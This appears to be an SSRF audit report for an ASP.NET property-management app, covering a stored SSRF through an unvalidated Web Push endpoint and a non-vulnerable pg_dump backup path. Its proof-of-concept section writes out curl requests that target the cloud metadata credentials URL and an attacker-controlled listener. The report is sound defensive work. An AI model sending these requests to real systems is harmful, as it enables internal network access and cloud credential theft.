# SSRF Analysis Results: Kumburgaz

## Executive Summary
- Outbound call sites analyzed: 3 (2 primary + 1 network-adjacent subprocess site; sites #1 and #2 from recon represent a single vulnerability chain)
- Vulnerable: 1
- Likely Vulnerable: 0
- Not Vulnerable: 1
- Needs Manual Review: 0

## Findings

### [VULNERABLE] Stored SSRF via attacker-controlled Web Push subscription endpoint
- **File**: `Areas/Mobile/Controllers/BildirimlerController.cs` (lines 43-74, `Abone` action) and `Services/PushSenderService.cs` (lines 39-66, `SendAsync`), dispatched from `Services/PushDispatchHostedService.cs`.
- **Endpoint / function**: `POST /m/Bildirimler/Abone(string endpoint, string p256dh, string auth)` → stores `subscription.Endpoint` → later `PushSenderService.SendAsync` → `Lib.Net.Http.WebPush.PushServiceClient.RequestPushMessageDeliveryAsync(target, message, ct)`, which performs an outbound `HttpClient` POST to `target.Endpoint`.
- **Issue**: The `Abone` action is reachable by any authenticated user (`[Authorize]` at controller level, no role restriction beyond authentication — includes the low-privilege "Sakin"/resident mobile role). The `endpoint` parameter is taken directly from the POST body and persisted to `db.PushSubscriptions.Endpoint` with **no validation whatsoever**: no URL-format check, no scheme restriction (`https` only), no host allowlist (e.g., restricting to known push services such as `fcm.googleapis.com`, `updates.push.services.mozilla.com`, `*.notify.windows.com`, Apple web push relay, etc.). `Lib.Net.Http.WebPush.PushServiceClient` is a thin wrapper around `HttpClient` (`WebPushClient`/`PushServiceClient` in the `Lib.Net.Http.WebPush` NuGet package) and performs **no host/IP allowlisting or SSRF protection itself** — it will POST to whatever `Endpoint` string is supplied, including `http://` URLs, internal hostnames, link-local/metadata addresses, and non-standard ports. This is a classic **stored/second-order SSRF**: the attacker's request (subscribing) and the vulnerable outbound request (sending the push) are decoupled in time and triggered later by a background job (`PushDispatchHostedService`/`PushQueue`) whenever any notification-triggering event occurs (new announcement, request status change, etc.) — meaning the server will autonomously and repeatedly fire authenticated-looking POST requests (containing VAPID auth headers derived from server-held private key, plus a JSON payload with title/body/url) to the attacker-chosen destination on an ongoing basis until the subscription is removed or the destination returns 404/410.
- **Taint trace**: `Request body (endpoint)` → `BildirimlerController.Abone` param `endpoint` (Areas/Mobile/Controllers/BildirimlerController.cs:43) → `Models.PushSubscription.Endpoint` (DB write, lines 57 or 66) → `PushDispatchHostedService.DispatchAsync` reads row → `PushSenderService.SendAsync(subscription, ...)` (Services/PushSenderService.cs:39) → `target.Endpoint = subscription.Endpoint` (line 46) → `_client.RequestPushMessageDeliveryAsync(target, message, ct)` (line 55) → internal `HttpClient.SendAsync` POST to `target.Endpoint`.
- **Impact**: Full SSRF primitive available to any authenticated low-privilege user (including "Sakin" residents restricted to the mobile area). Can be used to: probe/reach internal network services and ports reachable from the app server, hit cloud metadata endpoints (e.g. `http://169.254.169.254/latest/meta-data/...` on AWS, or the Azure/GCP equivalents) to attempt credential theft if hosted in a cloud VM/container, perform internal port scanning via response timing/HTTP status differences, or repeatedly trigger outbound requests as a semi-persistent beacon/DoS-amplification vector against a third party (the server will retry per every notification event until the endpoint 404/410s or FailCount logic disables it). Because VAPID auth headers are attached, the request also leaks the fact that this specific server is sending it (Subject/contact info in VAPID claims may be exposed to the attacker-controlled endpoint).
- **Mitigation present**: None. No scheme check, no host allowlist, no private/link-local IP blocklist, no SSRF-safe HTTP client/egress proxy evident anywhere in the push pipeline.
- **Remediation**: Validate `endpoint` at intake time in `Abone`: enforce `https://` scheme only, and enforce a strict host allowlist limited to known browser push service domains (FCM, Mozilla autopush, Windows Notification Service, Apple web push, etc. — ideally driven by a maintained list or suffix match against the known first-party push origins). Reject anything else with 400. As defense in depth, also validate at send-time in `PushSenderService.SendAsync` before calling `RequestPushMessageDeliveryAsync`, and/or route outbound push delivery through an egress-restricted HTTP handler that blocks RFC1918/loopback/link-local (169.254.0.0/16, including the cloud metadata IP) and resolves-then-checks each redirect hop (DNS rebinding protection) since a bare host allowlist alone can be bypassed if the allowlisted push provider ever redirects (unlikely for FCM/Mozilla but worth handling defensively) — however note IP/DNS blocklisting alone is not sufficient; the primary control must be the destination-host allowlist.
- **Dynamic Test**:
  ```
  # 1. Authenticate as a low-privilege "Sakin" (resident) user, obtain antiforgery token + cookie.
  # 2. Register a malicious push endpoint pointing at an internal/metadata address:
  curl -X POST 'https://TARGET/m/Bildirimler/Abone' \
    -H 'Cookie: <auth-cookie>' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode '__RequestVerificationToken=<csrf-token>' \
    --data-urlencode 'endpoint=http://169.254.169.254/latest/meta-data/iam/security-credentials/' \
    --data-urlencode 'p256dh=BExamplePublicKeyBase64UrlPaddingXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' \
    --data-urlencode 'auth=ExampleAuthSecretBase64Url'
  # Expect: 200 OK, row inserted into PushSubscriptions.

  # 3. Stand up a listener (e.g. `nc -lvp 8080` or an HTTP logging server such as
  #    `python -m http.server 8080` / requestbin/webhook.site) reachable from the app server's
  #    network, or simply use an external requestbin URL if server has outbound internet access:
  curl -X POST 'https://TARGET/m/Bildirimler/Abone' \
    -H 'Cookie: <auth-cookie>' \
    --data-urlencode '__RequestVerificationToken=<csrf-token>' \
    --data-urlencode 'endpoint=https://YOUR-REQUESTBIN-OR-LISTENER/callback' \
    --data-urlencode 'p256dh=BExamplePublicKeyBase64UrlPaddingXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' \
    --data-urlencode 'auth=ExampleAuthSecretBase64Url'

  # 4. Trigger any server event that fans out a notification (e.g. create an announcement,
  #    change a request/ticket status affecting this user) to force PushDispatchHostedService
  #    to fire. Observe an inbound POST at YOUR-REQUESTBIN-OR-LISTENER originating from the
  #    application server, confirming the server-side outbound request was made to
  #    attacker-controlled infrastructure (SSRF confirmed). Inspect headers for VAPID
  #    Authorization claims leaking server Subject/contact metadata.
  ```

### [NOT VULNERABLE] pg_dump/pg_restore subprocess host/port derived solely from server configuration
- **File**: `Services/BackupService.cs` (lines 39-58 `CreateBackupAsync`, 60-73 `RestoreAsync`, 124-153 `BuildPgDumpArgs`/`BuildPgRestoreArgs`/`BuildPgConnectionArgs`), invoked from `Controllers/BackupsController.cs` (SystemAdmin-only) and `Services/BackupHostedService.cs` (scheduled).
- **Reason**: The TCP destination (`host`, `port`) for `pg_dump`/`pg_restore` is parsed exclusively from `configuration.GetConnectionString("DefaultConnection")` (line 42/63), which comes from `appsettings.json`/environment variables set by the deployer — it is never read from request input, query string, form body, or any per-request override anywhere in the traced call path. `BuildPgConnectionArgs` (line 141-153) only ever consumes that same deployment-time connection string. The `reason` parameter (from `BackupsController`, SystemAdmin-only) is only used to build a local file name (`kumburgaz-{reason}-{stamp}.dump`, line 55) via string interpolation directly into a file path, not into the pg_dump/pg_restore host/port arguments — it doesn't touch `BuildPgConnectionArgs` at all, so it has no SSRF/network-destination impact (it could theoretically be a minor path-injection/argument-injection concern for the file name — e.g. `reason` containing `"` or path separators — but that's a path-traversal/command-injection issue, not SSRF, and is out of scope for this destination-control check; flagged separately to the path-traversal/command-injection track since `reason` is attacker-supplied on an admin-authenticated endpoint and isn't sanitized for characters like `"` before interpolation into the shell argument string, and `filePath` in `RestoreAsync` similarly gets interpolated raw into the process argument string — but neither influences the destination *host*, so this remains "Not Vulnerable" for SSRF specifically). `GetPgToolPath` (line 134-139) resolves the pg_dump/pg_restore *executable path*, also purely from env var / config, not user input. No code path found anywhere that lets an authenticated user (even SystemAdmin) supply or override the DB host/port at request time — `BackupsController` was checked and only exposes `reason`/`filePath`/backup-file-selection style parameters, never a connection-string or host/port override.
